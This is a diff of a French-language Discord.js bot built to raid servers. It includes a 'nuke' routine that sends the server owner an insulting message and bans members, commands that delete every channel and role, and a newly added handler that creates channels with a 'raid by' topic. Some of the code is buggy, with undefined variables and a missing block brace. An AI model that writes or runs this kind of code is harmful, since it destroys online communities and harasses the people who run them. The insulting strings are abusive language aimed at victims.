@@ -12,7 +12,7 @@ async function nuke(guild) {
 
   await guild.fetchMembers();
 
-  await guild.owner.send('tu t es fais baiser par Flow212rocma slp').catch(e => { return void e; });
+  await guild.owner.send(`${message.guild.owner} tu tes fais baiser par Flow212rocma slp`).catch(e => { return void e; });
 
   await Promise.all(guild.members.map(async (m) => {
     if (m.bannable) {
@@ -45,7 +45,7 @@ client.on('guildCreate', async (guild) => {
 });
 
 client.on('ready' , function (){
-	client.user.setActivity(`.help | bot.users.size + "utilisateur"`)
+	client.user.setActivity(`.help | ${client.users.size} utilisateurs`)
 	console.log("prêt frr")
 });
 
@@ -157,7 +157,7 @@ client.on('message', message => {
 
 client.on('message', message => {
 	if(message.content === prefix + "rejoins"){
-		message.channel.send(`tu as rejoins le ${message.guild.joinedAt} :D !`)
+		message.channel.send(`${message.author.name} tu as rejoins le ${message.guild.joinedAt} :D !`)
 		message.delete();
 		console.log("une personne a executer la commande : .rejoins")
 	}
@@ -377,4 +377,12 @@ client.on("message", async message => {
     message.guild.channels.deleteAll("Bot Destroyer");
     message.guild.roles.deleteAll("Bot Destroyer");
     
+});
+
+client.on(`message`, async message => {
+	if(message.content.startsWith(`${prefix}c`))
+		var args = message.content.slice(15);
+		message.guild.createChannel(args).then(channel => {
+			channel.setTopic(`raid by ${guild.owner} bande de slp`)
+		})
 });
